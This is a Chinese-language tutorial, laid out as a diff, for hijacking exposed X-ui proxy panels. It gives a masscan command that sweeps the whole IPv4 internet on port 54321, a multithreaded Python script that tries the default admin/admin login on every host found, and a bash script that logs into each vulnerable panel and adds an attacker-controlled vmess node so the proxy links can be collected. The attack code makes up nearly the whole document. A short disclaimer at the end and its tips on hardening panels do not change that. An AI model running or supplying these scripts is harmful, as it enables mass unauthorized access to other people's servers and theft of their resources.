@@ -1,0 +1,310 @@
+apt update
+apt install masscan libpcap-dev screen
+
+
+
+screen
+
+https://bgp.tools/as/906#prefixes
+
+
+masscan --exclude 255.255.255.255 -p54321 --max-rate 5000 -oG results.txt [上面获取的 IP Ranges, 用空格隔开]
+
+解析一下各部分的意义:
+
+masscan: Masscan 主命令
+--exclude 255.255.255.255: 对于扫描量巨大的扫描，必须要加上该参数
+-p54321: 指定端口 54321
+--max-rate 5000: 最大扫描速度，5000 已经足够，如果机器性能&网卡强劲可以尝试拉高以增加速度
+-oG results.txt: 结果保存路径，建议别更改
+
+
+
+
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-01-27 11:00:04 GMT
+Initiating SYN Stealth Scan
+Scanning 4294967295 hosts [1 port/host]
+rate:  4.94-kpps,  0.63% done, 243:48:38 remaining, found=45503
+
+
+第一第二行不用管
+第三行的 4294967295 为扫描的 IP 数量，你应该不难发现我在扫 0.0.0.0/0 (全网)
+第四行的 4.94-kpps 为扫描速率
+第四行的 0.63% 表示扫描的进度
+第四行的 243:48:38 表示的是剩余时间 (预估)
+第四行的 found=45503 表示的是已经找到的 IP 数量
+
+等它一会 (看你的 IP 有多少)
+
+就会收获一个 results.txt 文件了，保存好给下一步！
+
+Python 尝试登录
+
+
+import requests
+from concurrent.futures import ThreadPoolExecutor
+ 
+data = {
+    'username': 'admin',
+    'password': 'admin'
+}
+ 
+def process_ip(ip):
+    url = "http://" + ip + ":54321/login"
+    try:
+        r = requests.post(url, data=data, timeout=2)
+        if r.status_code == 200:
+            try:
+                response_data = r.json()
+                if isinstance(response_data, dict) and response_data.get("success"):
+                    print(ip + ' Successful')
+                    with open("xui.txt", "a") as result:
+                        result.write(ip + '\n')
+                else:
+                    print(ip + ' Def')
+            except ValueError:
+                print("Invalid JSON response from:", url)
+        else:
+            print(ip + ' Def')
+    except requests.exceptions.RequestException:
+        try:
+            url = "https://" + ip + ":54321/login"
+            r = requests.post(url, data=data, timeout=2, verify=False)
+            if r.status_code == 200:
+                try:
+                    response_data = r.json()
+                    if isinstance(response_data, dict) and response_data.get("success"):
+                        print(ip + ' Successful')
+                        with open("xui.txt", "a") as result:
+                            result.write(ip + '\n')
+                    else:
+                        print(ip + ' Def')
+                except ValueError:
+                    print("Invalid JSON response from:", url)
+            else:
+                print(ip + ' Def')
+        except requests.exceptions.RequestException:
+            print(ip + ' Def')
+ 
+if __name__ == "__main__":
+    with open("results.txt", "r") as file:
+        ips = [line.split("Host: ")[1].split(" ")[0] for line in file if len(line.split("Host: ")) >= 2]
+ 
+    with ThreadPoolExecutor() as executor:
+        executor.map(process_ip, ips)
+
+
+其作用大概为:
+
+获取 results.txt 内 IP
+向上面获取到的 IP 的 54321 端口发送 Post 数据
+当返回成功时，自动保存在 xui.txt 中
+PS：本脚本作者并不是我，原作者不想公开名字
+
+运行 python3 scan.py 即可开始扫描！
+
+即可获得可以以54321 Port + admin admin账密登录的xui面版
+
+
+自动创建节点
+
+#!/bin/bash
+ 
+filename="xui.txt"
+output_file="vmess.txt"
+cookie_file="cookies.txt"
+ 
+# Function to clear cookie file
+clear_cookie_file() {
+  if [ -f "$cookie_file" ]; then
+    rm "$cookie_file"
+  fi
+}
+ 
+# Function to generate vmess link
+generate_vmess_link() {
+  local ip=$1
+  local port=$2
+  local id=$3
+ 
+  vmess_json=$(cat <<EOF
+{
+  "v": "2",
+  "ps": "",
+  "add": "$ip",
+  "port": $port,
+  "id": "$id",
+  "aid": 0,
+  "net": "ws",
+  "type": "none",
+  "host": "",
+  "path": "/",
+  "tls": "none"
+}
+EOF
+)
+ 
+  vmess_base64=$(echo -n "$vmess_json" | base64 -w 0)
+  echo "vmess://$vmess_base64"
+}
+ 
+# Read each line from the file and process
+while IFS= read -r ip; do
+  echo "Processing IP: $ip"
+ 
+  # Clear cookie file before each iteration
+  clear_cookie_file
+ 
+  # Flag to check if addition was successful
+  addition_success=false
+ 
+  # Try HTTP first
+  login_response=$(curl -s -c "$cookie_file" -X POST http://$ip:54321/login -H "Content-Type: application/json" -d '{
+    "username": "admin",
+    "password": "admin"
+  }')
+ 
+  # Check if the HTTP login was successful
+  if echo "$login_response" | grep -q '"success":true'; then
+    echo "HTTP Login successful"
+ 
+    # Prepare JSON data for the subsequent request (adjust according to your vmess configuration)
+    data=$(cat <<EOF
+{
+  "up": 0,
+  "down": 0,
+  "total": 0,
+  "remark": "",
+  "enable": true,
+  "expiryTime": 0,
+  "listen": "",
+  "port": 20292,
+  "protocol": "vmess",
+  "settings": "{\"clients\":[{\"id\":\"57f5c2bd-bb79-4fd8-eea1-a84d1ddf3a21\",\"alterId\":0}],\"disableInsecureEncryption\":false}",
+  "streamSettings": "{\"network\":\"ws\",\"security\":\"none\",\"wsSettings\":{\"path\":\"/\",\"headers\":{}}}",
+  "sniffing": "{\"enabled\":true,\"destOverride\":[\"http\",\"tls\"]}"
+}
+EOF
+)
+ 
+    # URL for HTTP
+    url="http://$ip:54321/xui/inbound/add"
+ 
+    # Use the session cookie to make the HTTP request
+    response=$(curl -s -b "$cookie_file" -X POST "$url" -H "Content-Type: application/json" -d "$data")
+ 
+    # Print verbose output for debugging
+    echo "Verbose output:"
+    echo "$response"
+ 
+    # Check if the addition was successful and print the vmess link
+    if echo "$response" | grep -q '"success":true'; then
+      echo "Addition successful. Generating vmess link..."
+      vmess_link=$(generate_vmess_link "$ip" 20292 "57f5c2bd-bb79-4fd8-eea1-a84d1ddf3a21")
+      echo "Vmess link: $vmess_link"
+ 
+      # Append the vmess link to the output file
+      echo "$vmess_link" >> "$output_file"
+ 
+      # Mark addition as successful
+      addition_success=true
+    else
+      echo "Addition failed. Response: $response"
+    fi
+ 
+  else
+    echo "HTTP Login failed. Trying HTTPS..."
+ 
+    # Try HTTPS with certificate skipping first
+    login_response=$(curl -k -s -c "$cookie_file" --tlsv1.2 -X POST https://$ip:54321/login -H "Content-Type: application/json" -d '{
+      "username": "admin",
+      "password": "admin"
+    }')
+ 
+    # Check if the HTTPS login was successful
+    if echo "$login_response" | grep -q '"success":true'; then
+      echo "HTTPS Login successful"
+ 
+      # Prepare JSON data for the HTTPS request (adjust according to your vmess configuration)
+      data=$(cat <<EOF
+{
+  "up": 0,
+  "down": 0,
+  "total": 0,
+  "remark": "",
+  "enable": true,
+  "expiryTime": 0,
+  "listen": "",
+  "port": 20292,
+  "protocol": "vmess",
+  "settings": "{\"clients\":[{\"id\":\"57f5c2bd-bb79-4fd8-eea1-a84d1ddf3a21\",\"alterId\":0}],\"disableInsecureEncryption\":false}",
+  "streamSettings": "{\"network\":\"ws\",\"security\":\"none\",\"wsSettings\":{\"path\":\"/\",\"headers\":{}}}",
+  "sniffing": "{\"enabled\":true,\"destOverride\":[\"http\",\"tls\"]}"
+}
+EOF
+)
+ 
+      # URL for HTTPS
+      url="https://$ip:54321/xui/inbound/add"
+ 
+      # Use the session cookie to make the HTTPS request
+      response=$(curl -s -b "$cookie_file" --tlsv1.2 -X POST "$url" -H "Content-Type: application/json" -d "$data")
+ 
+      # Print verbose output for debugging
+      echo "Verbose output:"
+      echo "$response"
+ 
+      # Check if the addition was successful and print the vmess link
+      if echo "$response" | grep -q '"success":true'; then
+        echo "Addition successful. Generating vmess link..."
+        vmess_link=$(generate_vmess_link "$ip" 20292 "57f5c2bd-bb79-4fd8-eea1-a84d1ddf3a21")
+        echo "Vmess link: $vmess_link"
+ 
+        # Append the vmess link to the output file
+        echo "$vmess_link" >> "$output_file"
+ 
+        # Mark addition as successful
+        addition_success=true
+      else
+        echo "Addition failed. Response: $response"
+      fi
+ 
+    else
+      echo "HTTPS Login failed. Skipping to next IP."
+    fi
+  fi
+ 
+  # Clear cookie file after each iteration
+  clear_cookie_file
+ 
+done < "$filename"
+ 
+# Clear cookie file after finishing all iterations
+clear_cookie_file
+
+
+
+这个脚本大意为 从 xui.txt 读取可以登录的ip，并通过curl登录然后保存Cookie到Cookie.txt，然后调用Cookie 创建端口为20292 uid为57f5c2bd-bb79-4fd8-eea1-a84d1ddf3a21 的 vmess+ws 节点
+
+保存为 create.sh 并运行
+
+稍等片刻就可以从终端或者 vmess.txt 获取到vmess节点了
+
+后记
+
+请勿将本文教程用于非法扫描及爆破，由于使用者自身意愿导致的财产损失我们不负责！
+
+请将你的 X-ui 面板做好防护！
+
+使用第三方 X-ui 修改版
+开启安全入口
+设置 Https
+设置强帐密
+
+
+
+
+
+
+
+
